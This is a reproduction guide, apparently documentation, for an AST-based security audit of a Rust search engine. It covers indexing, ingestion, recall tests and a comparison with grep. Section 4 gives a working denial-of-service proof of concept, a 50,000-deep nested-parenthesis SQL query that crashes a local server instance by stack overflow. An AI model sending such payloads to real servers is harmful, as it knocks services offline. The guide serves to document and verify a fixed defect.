# Reproduce every result

All numbers reproduce from scratch. Scripts:
[`../../examples/rust-ast-audit/`](../../examples/rust-ast-audit/).

## 0. Prerequisites

```bash
python3 -m venv venv && . venv/bin/activate
pip install tree-sitter==0.26.0 tree-sitter-rust==0.24.2
# a release xerj binary:
cargo build --release -j 32 -p xerj-server   # produces engine/target/release/xerj
```

## 1. Build the substrate (extract once, ~3.2s)

```bash
cd docs/examples/rust-ast-audit
python3 rust_ast_index.py ../../../engine --out ./ast-out
# → files_total=197 files_parsed=197 error_nodes_total=0
#   ast_function_nodes=5095 emitted_function_records=5095 function_coverage_pct=100.0
#   call_edges=87137 routes=477 unsafe_block_sites=23 unsafe_fn_declarations=2
```

`coverage.json` holds the full per-file accounting. Function coverage is asserted
100% by comparing emitted records to an independent count of `function_item` AST
nodes.

## 2. Boot xerj and ingest (isolated instance, ~1.9s)

```bash
cat > audit.toml <<'TOML'
[server]
rest_port = 8390
grpc_port = 8391
es_compat_port = 9310
bind_address = "127.0.0.1"
data_dir = "./auditdata"
TOML
# In this sandbox, boot in the BACKGROUND (a foreground boot is reaped):
../../../engine/target/release/xerj --insecure -c audit.toml &
until [ "$(curl -s -o /dev/null -w '%{http_code}' -m2 localhost:9310/)" = "200" ]; do sleep 1; done

python3 ingest.py ./ast-out --url http://127.0.0.1:9310
# → rustfns 5095/5095, rustcalls 87137/87137, rustroutes 477/477 — all match:true
```

Exact doc-count parity (sent == indexed) is asserted by the script; a mismatch
exits non-zero.

## 3. The ground-truth recall test

```bash
# index the PRE-#69 commit under a _pre69 suffix
git worktree add /tmp/pre69 --detach $(git rev-parse <PR#69-merge>^1)
python3 rust_ast_index.py /tmp/pre69/engine --out ./ast-pre69
python3 ingest.py ./ast-pre69 --url http://127.0.0.1:9310 --suffix _pre69

# F1: the query-parser recursion cycle is UNGUARDED pre-#69, GUARDED on main
python3 find_recursion_cycles.py ./ast-pre69 | grep -A4 parse_qs   # has_depth_guard=False
python3 find_recursion_cycles.py ./ast-out   | grep -A4 parse_qs   # parse_qs_unary guard=True

# F7: evolve_schema_* gains reads_config_limit=true after the fix
curl -s localhost:9310/rustfns_pre69/_search -H 'Content-Type: application/json' \
  -d '{"query":{"prefix":{"fn_name":"evolve_schema"}},"_source":["fn_name","reads_config_limit"]}'
#   → reads_config_limit:false  (pre-fix)
curl -s localhost:9310/rustfns/_search -H 'Content-Type: application/json' \
  -d '{"query":{"prefix":{"fn_name":"evolve_schema"}},"_source":["fn_name","reads_config_limit"]}'
#   → reads_config_limit:true   (fixed)
```

## 3b. Detection quality: XERJ vs grep on all six known bugs

```bash
python3 detection_quality.py --url http://127.0.0.1:9310 --suffix _pre69 \
    --tree /tmp/pre69 --astdir ./ast-pre69
# → RECALL   XERJ 6/6   grep 4/6
#   TRIAGE   XERJ 84,122 tokens   grep 2,715,003 tokens
```

Per-bug candidates, ranks, and the in-sample caveat are in
[DETECTION-QUALITY.md](DETECTION-QUALITY.md). Note that `grep max_actions_per_bulk`
on the pre-fix tree returns **0 lines** — F7 and F8 are *missing* code, which no
grep can find.

## 4. The Critical finding — crash a live server

```bash
# a throwaway instance so you don't kill your audit substrate
../../../engine/target/release/xerj --insecure -c crash.toml &   # es_compat_port=9311
until [ "$(curl -s -o /dev/null -w '%{http_code}' -m2 localhost:9311/)" = "200" ]; do sleep 1; done
curl -s -X PUT localhost:9311/t -H 'Content-Type: application/json' \
  -d '{"mappings":{"properties":{"a":{"type":"integer"}}}}'

# baseline: fine
curl -s -m5 localhost:9311/_sql -H 'Content-Type: application/json' \
  -d '{"query":"SELECT * FROM t WHERE (a = 1)"}' -o /dev/null -w 'HTTP %{http_code}\n'   # 200

# attack: process aborts
python3 -c "print('{\"query\":\"SELECT * FROM t WHERE '+'('*50000+'a = 1'+')'*50000+'\"}')" > bomb.json
curl -s -m15 localhost:9311/_sql -H 'Content-Type: application/json' --data-binary @bomb.json \
  -o /dev/null -w 'HTTP %{http_code}\n'   # 000 (empty reply — server gone)
# the server log shows: "fatal runtime error: stack overflow, aborting"; the
# process exits 134 (SIGABRT).
```

## 5. Query cookbook

Every audit query, with live hit counts, is in
[`../../examples/rust-ast-audit/QUERY_COOKBOOK.md`](../../examples/rust-ast-audit/QUERY_COOKBOOK.md).
